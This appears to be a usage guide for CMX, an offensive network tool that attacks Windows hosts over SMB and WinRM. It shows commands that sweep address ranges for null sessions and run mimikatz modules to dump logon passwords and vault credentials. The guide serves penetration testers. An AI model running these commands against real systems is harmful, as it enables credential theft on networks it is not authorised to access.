---
layout: default
title: General Usage
---

# Basic Command Execution 

CMX can be a little picky when it comes argument positioning.  
  
In general, commands follow this format.  
```
cmx [position1] PROTOCOL [-h] TARGET [target options] [-M MODULE [-mo module-options]]  
```
Note: position1 args MUST come before the protocol and are optional arguments.  
There are a few options beyond - -verbose, but you most likely don't need to use these.    
```
[position1] 
	--threads X    the number of threads          type=int, defaults to 100 
	--timeout X    thread timeout                 type=int, defaults to 10 
	--verbose      enable verbose output    

Example:
# cmx --verbose --threads 10 --timeout 60 smb 192.168.1.126 -u agrande -p User\!23           
```
*In the above command, also note the escape before the ! character.* 
--------------------------------------------------------------------------------------------------------------------------------------------------------
PROTOCOL   **always required**   
The protocols are limited to smb and winrm currently.   
An ugly list of protocol options can be found using -h  
`#~ cmx smb -h`     

--------------------------------------------------------------------------------------------------------------------------------------------------------
TARGET   **always required**   
Follows a protocol.   
Can be a single IP, CIDR, whatever you call 10.10.33.100-200, a FQDN (target.domain.com),  
or a file containing one of those types per line. 
```
#~ cmx smb 10.10.33.100
#~ cmx smb 10.10.33.0/25
#~ cmx smb 10.10.33.120-127
#~ cmx smb win10e.ocean.depth
#~ cmx smb targets.txt
```  

[target options]  - optional  
The location for options described further in the protocol guide(s)  
```
#~ cmx smb 10.10.33.100 -u user -p password1
```  
--------------------------------------------------------------------------------------------------------------------------------------------------------
[-M ModuleName]   - optional     
A list of available modules for a given protocol can be found by passing -L after the protocol.  
```
#~ cmx smb -L
``` 
Modules dont neccesarily require target options but I'm not aware of any that can be executed without credentials.       
Modules are further documented in the [protocol]-module-reference guides  
```
#~ cmx smb 10.10.33.100 -u user -p password1 -M mimikatz
``` 
adding - -options after the module will give a particular modules' options.   
``` 
#~ cmx smb 10.10.33.100 -u user -p password1 -M mimikatz --options

[*] mimikatz module options:

    Module Options:
           COMMAND  Mimikatz command to execute (default: 'privilege::debug sekurlsa::logonpasswords exit')
``` 

[-mo module_options]  - optional  
Can only be used after a module is referenced.  
Based on the module options, you set the OPTION equal to an argument.  
See the mimikatz example below.  
``` 
cmx smb 10.10.33.123 -u agrande -p User\!23 -M mimikatz -mo COMMAND='privilege::debug vault::list exit'                                                             
``` 
--------------------------------------------------------------------------------------------------------------------------------------------------------


### Output
CMX will always output the fingerprint of targets it connects with, followed by results.  
  
The output follows the general format:  
`date  protocol     targetIP:port   targethostname(or IP if unknown)  [indicator] Message`  
  
Indicators:  
`[*]` for informational messages  
`[-]` for failure messages  
`[+]` for success messages  
`[!]` for warning messages  
    
Example checking for null sessions:  
```
#~ cmx smb 10.10.33.120-127 -u '' -p '' 

Aug.20.19 12:20:15  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 12:20:15  SMB         10.10.33.121:445  10.10.33.121 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 12:20:15  SMB         10.10.33.124:445  10.10.33.124 [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 12:20:15  SMB         10.10.33.122:445  10.10.33.122 [-] OCEAN\: STATUS_ACCESS_DENIED 
Aug.20.19 12:20:15  SMB         10.10.33.121:445  10.10.33.121 [+] OCEAN\: 
Aug.20.19 12:20:15  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 12:20:15  SMB         10.10.33.125:445  10.10.33.125 [*] Windows 10.0 Build 17763 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
Aug.20.19 12:20:15  SMB         10.10.33.124:445  10.10.33.124 [+] OCEAN\: 
Aug.20.19 12:20:15  SMB         10.10.33.125:445  10.10.33.125 [-] OCEAN\: STATUS_ACCESS_DENIED 
Aug.20.19 12:20:15  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\: 
Aug.20.19 12:20:21         [!] Could not connect to 10.10.33.127, no route to host. Can you ping it? [!]
Aug.20.19 12:20:21         [!] Could not connect to 10.10.33.126, no route to host. Can you ping it? [!]

```